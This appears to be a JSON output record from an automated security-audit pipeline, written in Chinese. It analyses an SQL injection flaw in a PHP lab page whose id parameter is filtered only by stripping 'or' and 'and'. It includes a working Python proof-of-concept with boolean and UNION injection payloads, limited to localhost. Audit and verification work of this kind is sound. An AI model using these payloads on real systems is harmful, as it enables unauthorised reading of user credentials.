@@ -1,0 +1,175 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "SQLI-003",
+  "input_version": "v2",
+  "prompt_version": "final-wp4-v1",
+  "analysis_stage": "parent",
+  "received_packet_ids": ["SQLI-003"],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "单包已完整覆盖 GET 参数读取（171 行）、blacklist 处理（177 行、202-207 行）、字符串拼接（180 行）、mysql_query 执行（181 行）与业务字段回显（186-189 行）的整条链路。过滤只删除 or/and 字面子串，未做参数化、未转义单引号、未使用白名单，而所给载荷不含被删子串即可改变查询语义；静态证据链闭合，故为 high。但 PHP/MySQL 版本、sql_mode、连接字符集与上游拦截层未知，且本次无运行证据，故 verdict 保持待验证而非确认。"
+  },
+  "findings": [
+    {
+      "finding_id": "SQLI-003-F1",
+      "vulnerability_type": "SQL注入（单引号字符串拼接，布尔盲注/UNION 注入）",
+      "locations": [
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 171,
+          "line_end": 171,
+          "quote": "$id=$_GET['id'];"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 177,
+          "line_end": 177,
+          "quote": "$id= blacklist($id);"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 180,
+          "line_end": 180,
+          "quote": "$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 181,
+          "line_end": 181,
+          "quote": "$result=mysql_query($sql);"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 186,
+          "line_end": 186,
+          "quote": "echo 'Your Login name:'. $row['username'];"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 194,
+          "line_end": 194,
+          "quote": "print_r(mysql_error());"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 204,
+          "line_end": 205,
+          "quote": "$id= preg_replace('/or/i',\"\", $id);"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 208,
+          "line_end": 208,
+          "quote": "echo \"Hint: Your Input is Filtered with following result: \".$hint;"
+        }
+      ],
+      "data_flow": [
+        "入口：169 行判断 isset($_GET['id'])，171 行把原始 GET 值读入 $id；片段内没有读取其他请求参数。",
+        "日志副作用：173-175 行在过滤之前把原始 $id 追加写入 result.txt（与注入判定无关，但存在输入泄露风险）。",
+        "过滤：177 行调用 blacklist($id)；202-207 行只做 preg_replace('/or/i') 与 preg_replace('/AND/i') 的子串删除，未转义单引号、反斜杠、注释符或空白，也未做类型/白名单校验。",
+        "拼接：180 行把 $id 直接放在 id='…' 的单引号内，并追加常量 LIMIT 0,1；引号边界由输入自行闭合。",
+        "执行：181 行 mysql_query($sql) 执行拼接结果；182 行 mysql_fetch_array 取第一行。",
+        "输出：183-190 行把 username 与 password 回显到 Your Login name / Your Password 区域；191-196 行在无行时回显 mysql_error()；208 行回显过滤后的 $hint。",
+        "观察点：对同一 param 分别发送正常 id=1、不存在 id=-1、布尔真、布尔假与 UNION 标记载荷，比较上述业务字段的解析结果；错误回显只作辅助信号，不能代替行命中判定。"
+      ],
+      "principle": "180 行在单引号内直接插入 $id，单引号未转义。攻击者用 ' 结束字符串后追加布尔表达式（如 ||'1'='1、&&'1'='2）或 UNION SELECT，即可改变 WHERE 语义或结果集。blacklist 属于黑名单子串删除，不是参数化：只删除 or/and，不含这两个子串的 ||、&&、UNION SELECT、-- - 注释全部通过；删除操作还可能破坏含 or/and 的合法输入。因此过滤没有约束实际进入查询的值，必要条件（输入可控、路径可达、可改变查询语义）均成立。",
+      "impact": "可读取 security.users 表中任意行（含其他用户的 username/password 列），并可用 UNION 在响应同列数位置回显其他查询结果；也可用布尔真假条件逐位推断数据。194 行在无行时输出数据库错误，使盲注更易判断。实际影响范围受连接账号权限、表结构与 error_reporting 限制，未经运行验证。",
+      "preconditions": [
+        "目标环境加载并执行该文件，且 include('../sql-connections/sql-connect.php') 提供可用连接，security 库与 users 表存在。",
+        "PHP 运行环境支持 mysql_* 接口（PHP 7 之前，或已提供兼容层/封装），否则请求在 181 行因函数未定义而中断，无法进入查询。",
+        "请求携带 GET 参数 id；载荷不得包含 or/and 子串，否则被 blacklist 删除而改变自身。",
+        "部署层没有在 PHP 之前重写或拦截单引号、UNION、注释符的反向代理/WAF/IDS。",
+        "MySQL 未启用把 || 当字符串连接的 sql_mode（PIPES_AS_CONCAT）；该条件只影响布尔对照，UNION 标记判据不依赖它。"
+      ],
+      "counterexamples": [
+        "若 180 行改用 mysql_real_escape_string/intval 或 mysqli/PDO 预处理绑定，单引号会被转义为值字符，本路径不成立；当前片段无任何转义或绑定。",
+        "若 202-207 行改为对单引号、注释符、空白、括号做白名单或完整拒绝，载荷会被阻断；当前实现只删除 or/and，不是这种防护。",
+        "若旧配置 magic_quotes_gpc=On 对所有 GET 值自动加反斜杠且未被绕过，单引号会被转义；片段未展示该配置，且不能把已弃用机制当作有效防护。",
+        "若连接账号对 security.users 无 SELECT 权限，或 users 表不存在，查询失败，注入只能触发错误而不能读取数据。",
+        "若文件在 181 行之前还有未提供的校验/路由逻辑（本片段从 <?php 直接开始），路径可能被提前阻断；需补充完整文件确认。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "Python 3（仅标准库）",
+        "code": "#!/usr/bin/env python3\n#\n# SQLI-003 / final-wp4-v1 local verification draft (marker only, non-destructive).\n# Sink: normalized_samples/SQLI-003.php lines 171,177,180,181,186,188,194,208.\n# Filter: blacklist() removes substrings or/and (case-insensitive) only.\n# The audited file request path is not in the audit input: --path is mandatory.\n# --columns and --marker-pos must be adapted to the deployed users table.\n# Only GET parameter id is used. No enumeration, dumping or writes.\nimport argparse\nimport json\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nLOCAL_HOSTS = ('localhost', '127.0.0.1', '::1')\nLOGIN_LABEL = 'Your Login name:'\nPASS_LABEL = 'Your Password:'\nHINT_LABEL = 'Hint: Your Input is Filtered with following result:'\nPHP_ERRORS = ('Fatal error', 'Parse error', 'Warning:', 'mysql_query', 'mysqli_query')\nBANNED = ('or', 'and')\nTRUE_COND = \"-1'||'1'='1\"\nFALSE_COND = \"-1'&&'1'='2\"\nUNION_FMT = \"-1' UNION SELECT \"\nUNION_TAIL = '-- -'\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        return None\n\n\ndef check_host(base_url):\n    p = urllib.parse.urlparse(base_url)\n    if p.scheme not in ('http', 'https'):\n        sys.exit('[ABORT] --base-url must start with http:// or https://')\n    if not p.hostname or p.hostname.lower() not in LOCAL_HOSTS:\n        sys.exit('[ABORT] only localhost/127.0.0.1/::1 targets are allowed')\n\n\ndef read_cookie(path):\n    if not path:\n        return None\n    pairs = []\n    with open(path, 'r', encoding='utf-8') as fh:\n        for line in fh:\n            line = line.strip()\n            if line and not line.startswith('#'):\n                pairs.append(line)\n    return '; '.join(pairs) if pairs else None\n\n\ndef fetch(base_url, path, param, value, cookie, timeout):\n    url = base_url.rstrip('/') + path + '?' + urllib.parse.urlencode({param: value})\n    req = urllib.request.Request(url, method='GET')\n    req.add_header('User-Agent', 'sqli003-wp4-draft/1.0')\n    if cookie:\n        req.add_header('Cookie', cookie)  # never printed\n    opener = urllib.request.build_opener(NoRedirect)\n    try:\n        with opener.open(req, timeout=timeout) as resp:\n            body = resp.read().decode('utf-8', 'replace')\n            return {'status': getattr(resp, 'status', resp.getcode()),\n                    'location': None, 'body': body, 'transport_error': None}\n    except urllib.error.HTTPError as exc:\n        body = exc.read().decode('utf-8', 'replace') if exc.fp else ''\n        return {'status': exc.code, 'location': exc.headers.get('Location'),\n                'body': body, 'transport_error': None}\n    except Exception as exc:\n        return {'status': None, 'location': None, 'body': '',\n                'transport_error': type(exc).__name__ + ': ' + str(exc)[:200]}\n\n\ndef field(body, label):\n    i = body.find(label)\n    if i < 0:\n        return None\n    rest = body[i + len(label):]\n    j = rest.find('<')\n    if j >= 0:\n        rest = rest[:j]\n    return rest.strip()\n\n\ndef union_payload(columns, marker, marker_pos):\n    parts = []\n    for i in range(1, columns + 1):\n        parts.append(\"'\" + marker + \"'\" if i == marker_pos else str(i))\n    return UNION_FMT + ','.join(parts) + UNION_TAIL\n\n\ndef main():\n    ap = argparse.ArgumentParser(description='SQLI-003 local marker draft')\n    ap.add_argument('--base-url', required=True, help='e.g. http://127.0.0.1:8080')\n    ap.add_argument('--path', required=True, help='request path of the audited file (not given in audit input)')\n    ap.add_argument('--param', default='id', help='GET parameter from code: id')\n    ap.add_argument('--session-file', default=None, help='optional file with name=value Cookie lines')\n    ap.add_argument('--timeout', type=float, default=10.0)\n    ap.add_argument('--columns', type=int, default=3, help='users table SELECT column count; adapt')\n    ap.add_argument('--marker', default='POCMARKERSQLI003', help='synthetic marker; must not contain or/and')\n    ap.add_argument('--marker-pos', type=int, default=2, help='column position rendered as username')\n    ap.add_argument('--json-out', default=None)\n    args = ap.parse_args()\n\n    check_host(args.base_url)\n    if any(b in args.marker.lower() for b in BANNED):\n        sys.exit('[ABORT] marker contains a substring blacklist() removes')\n    if args.columns < 1 or not 1 <= args.marker_pos <= args.columns:\n        sys.exit('[ABORT] invalid --columns / --marker-pos')\n\n    cookie = read_cookie(args.session_file)\n    union = union_payload(args.columns, args.marker, args.marker_pos)\n    cases = [\n        ('baseline_present', '1', 'existing numeric id: normal row'),\n        ('baseline_absent', '-1', 'non-existent numeric id: empty'),\n        ('true_condition', TRUE_COND, 'boolean TRUE on absent id: row only if semantics changed'),\n        ('false_condition', FALSE_COND, 'boolean FALSE: must stay empty'),\n        ('union_marker', union, 'UNION marker must appear in parsed Login name'),\n    ]\n\n    results = {}\n    for name, value, why in cases:\n        if any(b in value.lower() for b in BANNED):\n            sys.exit('[ABORT] case ' + name + ' contains a blacklist() token')\n        r = fetch(args.base_url, args.path, args.param, value, cookie, args.timeout)\n        r['case'] = name\n        r['payload'] = value\n        r['why'] = why\n        r['login'] = field(r['body'], LOGIN_LABEL) if r['body'] else None\n        r['password'] = field(r['body'], PASS_LABEL) if r['body'] else None\n        r['hint'] = field(r['body'], HINT_LABEL) if r['body'] else None\n        r['php_error'] = any(t in r['body'] for t in PHP_ERRORS)\n        results[name] = r\n        print('[%s] status=%s location=%s login=%r password=%r hint=%r php_error=%s transport_error=%s' % (\n            name, r['status'], r['location'], r['login'], r['password'], r['hint'],\n            r['php_error'], r['transport_error']))\n\n    if any(r['transport_error'] for r in results.values()):\n        print('[STOP] transport failure: no vulnerability conclusion')\n        return 3\n    if any(r['php_error'] for r in results.values()):\n        print('[STOP] PHP/MySQL interface error in response: environment issue, not a filter')\n        return 2\n\n    base = results['baseline_present']\n    absent = results['baseline_absent']\n    true_c = results['true_condition']\n    false_c = results['false_condition']\n    mark = results['union_marker']\n\n    checks = [\n        ('normal_row_visible', base['login'] not in (None, ''), 'baseline id=1 login=' + repr(base['login'])),\n        ('absent_row_empty', absent['login'] in (None, ''), 'baseline id=-1 login=' + repr(absent['login'])),\n        ('no_redirect', all(r['location'] is None for r in results.values()), 'no 3xx Location'),\n        ('true_condition_row', true_c['login'] not in (None, ''), 'true condition login=' + repr(true_c['login'])),\n        ('false_condition_empty', false_c['login'] in (None, ''), 'false condition login=' + repr(false_c['login'])),\n        ('union_marker_in_username', mark['login'] == args.marker, 'union login=' + repr(mark['login'])),\n        ('filter_did_not_rewrite', mark['hint'] == union, 'hint=' + repr(mark['hint'])),\n    ]\n    ok = dict((c[0], c[1]) for c in checks)\n    for name, passed, detail in checks:\n        print('[CRITERION] %s: %s <- %s' % (name, 'PASS' if passed else 'FAIL', detail))\n\n    primary = all(ok.values())\n    print('[SUMMARY] injectable id parameter observed in this local run: %s' % primary)\n    if args.json_out:\n        with open(args.json_out, 'w', encoding='utf-8') as fh:\n            json.dump({'cases': results, 'criteria': ok, 'primary': primary}, fh, ensure_ascii=False, indent=2)\n    return 0\n\n\nif __name__ == '__main__':\n    sys.exit(main())\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.7+，仅使用 argparse/json/sys/urllib 标准库，无第三方依赖",
+          "不需要安装任何包；脚本不访问本地靶场之外的地址",
+          "可选 Cookie 会话文件（仅当该路径确需登录态），每行一个 name=value，文件不得提交到版本库",
+          "目标端需 PHP + mysql_* 兼容接口、security 库与 users 表"
+        ],
+        "parameters": [
+          "--base-url（必填）：本地靶场基址，脚本只接受 localhost/127.0.0.1/::1，http 或 https",
+          "--path（必填）：被审计文件的请求路径；审计片段未提供路由，必须人工填写",
+          "--param：默认 id，来自 171 行 $_GET['id']",
+          "--session-file：可选，提供 name=value 形式的 Cookie 行；运行输出不打印 Cookie",
+          "--columns：users 表 SELECT 列数，默认 3，必须按实际表结构调整",
+          "--marker：合成标记，默认 POCMARKERSQLI003，禁止包含 or/and 子串",
+          "--marker-pos：username 在 SELECT 列表中的位置，默认 2",
+          "--timeout：请求超时秒数，默认 10；--json-out：可选，保存逐请求摘要（不含 Cookie）"
+        ],
+        "steps": [
+          "1. 在授权本地靶场部署该片段，确认 include 的 sql-connect.php 可用、users 表存在且至少有 id=1 的行；同时记录 PHP/MySQL 版本与配置（本次未提供）。",
+          "2. 人工确认实际请求路径与 users 表列数（片段未给出）：用 --path 指定文件路由，用 --columns 指定列数；若列数不是 3，先只发 baseline 请求校准输出区域，再调整载荷。",
+          "3. 运行：python3 poc_sqli003.py --base-url http://127.0.0.1:8080 --path /实际路径/SQLI-003.php --param id --columns 3",
+          "4. 脚本自动依次发送五条 GET 请求：id=1（正常行）、id=-1（不存在行）、id=-1'||'1'='1（布尔真）、id=-1'&&'1'='2（布尔假）、UNION 标记载荷。",
+          "5. 对每条响应解析 Your Login name 与 Your Password 区域（脚本按标签截取到下一个 < 为止），并读取页面末尾的 Hint 行确认过滤未改写载荷。",
+          "6. 若退出码为 2（响应含 PHP/MySQL 接口错误）或 3（连接/超时失败），记录为环境或前置条件失败并停止，不得写成过滤生效或漏洞不存在。",
+          "7. 运行后由工作包4保存原始脚本、命令、环境与原始响应；本草案本身不构成运行证据。"
+        ],
+        "expected_observation": "id=1 时 Your Login name 与 Your Password 各有非空行值；id=-1 时两个区域为空；id=-1'||'1'='1 时两个区域重新出现行值（WHERE 语义被改变）；id=-1'&&'1'='2 时仍为空；UNION 请求中 Your Login name 区域等于 POCMARKERSQLI003（列位置正确时），且页面末尾 Hint 行逐字回显发送的载荷。",
+        "success_criteria": [
+          "正常行对照：id=1 响应中 Your Login name 解析值非空，证明业务输出区域可定位；若为空，说明路径、表数据或列位置不适配，先修前置条件。",
+          "空行对照：id=-1 的 Your Login name 为空且不含 PHP 接口错误，证明不存在行时确实没有行可显示。",
+          "真条件命中：id=-1'||'1'='1 的 Your Login name 非空而 id=-1 为空，说明单引号闭合后布尔表达式改变了 WHERE 语义；同时须确认无 3xx 跳转、无 Fatal error/Warning。",
+          "假条件为空：id=-1'&&'1'='2 的 Your Login name 为空，排除页面固定回显字符串造成的假阳性。",
+          "UNION 标记命中：UNION 请求的 Your Login name 解析值等于 --marker，且与 id=1 的用户名不同，证明注入点可控制结果列，而不只是触发错误。",
+          "过滤未改写：UNION 请求的 Hint 行与发送载荷一致（or/and 子串未被删除），说明差异来自 SQL 语义而非 blacklist 删字符。",
+          "所有请求 Location 均为空、无自动跟随跳转；任一请求出现 PHP/MySQL 接口错误时该次结果记为环境失败，不据此判定过滤或漏洞。"
+        ],
+        "limitations": [
+          "文件请求路径未在审计输入中给出，--path 必须人工适配；片段不能独立部署（依赖 ../sql-connections/sql-connect.php、db-creds.inc、security 库与 users 表）。",
+          "users 表列数与 username 所在位置未提供，默认 3 列与位置 2 只是常见结构假设，必须按实际表结构改 --columns/--marker-pos，否则 UNION 标记不会落在回显字段。",
+          "mysql_* 接口在 PHP 7+ 已移除；若无兼容层，脚本会观察到接口错误，这属于环境不兼容，不能解读为过滤生效或漏洞不存在。",
+          "|| 布尔对照依赖 MySQL 默认 sql_mode；若启用 PIPES_AS_CONCAT，应以 UNION 标记与假条件空行作为主要判据。",
+          "载荷只使用合成标记、布尔结构和 UNION 结构，不枚举库表、不导出真实记录；payload 为 GET 参数，长度需适配实际字段与 URL 限制，若被截断应在工作包4记录截断位置。",
+          "本次未运行脚本、未保存任何原始请求或响应，所有结论均为静态候选，execution_status=未运行。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "sql-connections/sql-connect.php 的实现：连接方式、字符集设置、错误抑制、是否设置 sql_mode（影响 || 语义）",
+    "db-creds.inc 中连接账号的权限（能否读取 security.users 之外的库表）",
+    "实际 PHP 版本与 mysql_* 兼容层是否存在；MySQL 版本、sql_mode 与 error_reporting 配置",
+    "被审计文件在 Web 根下的真实路径/路由与文件名（片段只给出内容）",
+    "users 表的实际列数、列顺序与字段类型（UNION 列位置依赖）",
+    "部署层是否存在反向代理/WAF/IDS 对单引号、UNION、注释符的拦截或重写，以及是否启用 magic_quotes_gpc 等旧配置",
+    "无行与出错两种情况下页面完整 HTML 模板，用于精确解析业务字段边界",
+    "该文件是否被上层路由或前置校验代码包裹（片段从 <?php 直接开始，未包含上层逻辑）"
+  ],
+  "risk_notes": [
+    "173-175 行在过滤前把原始 id 写入 Web 目录下的 result.txt，可能造成日志注入或输入信息泄露，属范围外风险。",
+    "191-196 行把 mysql_error() 回显给客户端，泄露 SQL 结构与数据库错误，可作为注入辅助信号，但本身不是注入成立证据。",
+    "208 行把过滤后的输入回显为 Hint，属反射型信息展示，若被其他页面复用可能形成 XSS 面；本次仅作为过滤观察点。",
+    "users 表同时存放 username 与 password 列并在页面回显，任何注入都会放大为口令泄露；该敏感性属于范围外业务影响。"
+  ],
+  "quality_notes": [
+    "mysql_* 系列函数自 PHP 7.0 起移除，属于过时 API；这是运行兼容性问题，本身不作为漏洞成立证据。",
+    "blacklist 采用正则删除子串而非参数化或白名单，属设计缺陷；删除操作还可能破坏含 or/and 的合法输入。",
+    "未设置连接字符集，宽字节等编码问题无法从片段判断，需要 sql-connect.php 佐证。",
+    "缺少输入长度与类型校验、缺少统一错误处理；错误输出未分级。"
+  ],
+  "limitations": [
+    "本次仅基于 SQLI-003 单包静态代码；父样本清单只含该包，因此 analysis_stage=parent，但不代表已获得运行行为验证。",
+    "片段不可独立部署，连接文件、凭据与表结构均缺失，无法确认查询是否真的执行成功。",
+    "blacklist() 的实际效果依赖 PCRE 与输入编码，且无法判断是否有未展示的上游校验。",
+    "未进行任何 HTTP 请求或数据库操作，无 runtime_evidence，verdict 保持待验证。"
+  ],
+  "runtime_evidence": []
+}
